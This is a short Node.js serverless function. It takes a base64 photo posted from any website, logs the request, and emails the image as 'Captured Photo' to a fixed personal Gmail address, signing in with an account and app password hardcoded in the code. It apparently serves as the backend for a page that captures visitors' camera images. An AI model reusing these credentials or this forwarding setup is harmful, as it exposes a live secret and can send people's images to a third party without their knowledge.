const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Ensure it's a POST request
  if (req.method === 'POST') {
    try {
      // Accessing the request body directly (no need to use req.json())
      const { photo } = req.body; // Destructure photo from the request body

      console.log('Received data:', req.body);  // Log the data to check what we receive

      // Check if the photo data is received
      if (!photo) {
        console.log('No photo data received');
        return res.status(400).json({ success: false, message: 'No photo data received' });
      }

      // Set up the transporter for sending the email
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'aleksadiscord1@gmail.com',
          pass: 'vamrkaxmpltrifsf', // Use your actual app password here
        },
      });

      // Set up email options
      const mailOptions = {
        from: 'aleksadiscord1@gmail.com',
        to: 'aleksatomic2008@gmail.com',
        subject: 'Captured Photo',
        text: 'Here is the captured photo.',
        attachments: [
          {
            filename: 'photo.jpg',
            content: photo.split(';base64,')[1], // Extract the base64 content after the data URL prefix
            encoding: 'base64',
          },
        ],
      };

      console.log('Sending email...');  // Log before sending the email

      // Send the email
      await transporter.sendMail(mailOptions);
      console.log('Email sent successfully');  // Log after email is sent
      return res.status(200).json({ success: true, message: 'Photo sent successfully!' });
    } catch (error) {
      console.error('Error processing request:', error);  // Log the error
      return res.status(500).json({ success: false, message: 'Internal server error', error: error.message });
    }
  } else {
    // Handle non-POST requests
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }
};
